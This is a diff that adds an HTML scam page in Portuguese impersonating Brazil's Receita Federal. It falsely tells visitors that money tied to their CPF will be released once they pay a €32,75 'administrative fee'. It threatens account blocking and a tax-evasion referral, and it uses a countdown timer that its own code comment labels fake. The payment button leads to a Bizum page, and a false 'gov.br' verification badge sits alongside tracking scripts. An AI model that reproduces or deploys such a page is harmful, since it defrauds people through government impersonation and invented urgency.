@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+<script
+        src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+        data-token="cfcd224e-fd8d-47fc-9834-de14d1c8ee3a"
+>
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Receita Federal - Regularização Digital</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #00296b;
+      color: #ffffff;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 40px 20px;
+      text-align: center;
+      background-color: #01397b;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      border-radius: 10px;
+      margin-top: 40px;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      color: #ff4c4c;
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+
+    p {
+      font-size: 16px;
+      line-height: 1.5;
+    }
+
+    .valor {
+      font-size: 24px;
+      font-weight: bold;
+      color: #00ffae;
+      margin: 20px 0;
+    }
+
+    .timer {
+      font-size: 18px;
+      color: #ffcc00;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    .btn {
+      display: inline-block;
+      background-color: #00d471;
+      color: #fff;
+      font-size: 18px;
+      padding: 15px 30px;
+      margin-top: 30px;
+      border: none;
+      border-radius: 8px;
+      text-decoration: none;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .btn:hover {
+      background-color: #00b160;
+    }
+
+    .alerta {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #ffaaaa;
+    }
+  </style>
+<!-- Tracking + Bizumel server-side (TikTok Events API) -->
+<script src="/up/up4/api/bizumel.js.php" async></script>
+<script src="/up/up4/api/tracking.js.php" async></script>
+</head>
+<body>
+  <div class="container">
+    <img src="logo1.png" alt="Receita Federal" class="logo"/>
+
+    <h1>COMUNICAÇÃO OFICIAL URGENTE</h1>
+<p>
+  Identificamos em nosso sistema um <strong>saldo pendente referente a atividades digitais vinculadas ao seu CPF</strong>.
+</p>
+
+<p>
+  Para que o valor seja liberado com segurança e regularidade, é necessário efetuar o <strong>recolhimento da taxa administrativa</strong> no valor de:
+</p>
+
+<p class="valor"><strong>€ 32,75</strong></p>
+
+<p>
+  O <strong>não pagamento</strong> dentro do prazo estipulado poderá resultar em:
+</p>
+
+<ul style="text-align: left; margin-left: 30px; line-height: 1.6;">
+  <li><strong>Bloqueio automático</strong> do saldo;</li>
+  <li><strong>Restrição temporária</strong> do CPF nos sistemas financeiros;</li>
+  <li>Encaminhamento do caso para <strong>análise de sonegação fiscal</strong>.</li>
+</ul>
+
+<p>
+  Para evitar quaisquer transtornos, regularize sua situação o quanto antes.
+</p>
+
+
+    <div class="timer" id="countdown">Tempo restante: 08:59</div>
+
+    <a class="btn" href="/up/up4/bizum.html">Pagar taxa e liberar valor</a>
+
+    <div class="alerta">
+      Ambiente 100% seguro e verificado - gov.br/validação
+    </div>
+  </div>
+
+  <script>
+    // Contagem regressiva fake
+    let minutes = 8;
+    let seconds = 59;
+    const countdown = document.getElementById("countdown");
+
+    const interval = setInterval(() => {
+      seconds--;
+      if (seconds < 0) {
+        seconds = 59;
+        minutes--;
+      }
+
+      if (minutes < 0) {
+        clearInterval(interval);
+        countdown.innerText = "Tempo expirado!";
+      } else {
+        countdown.innerText = `Tempo restante: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
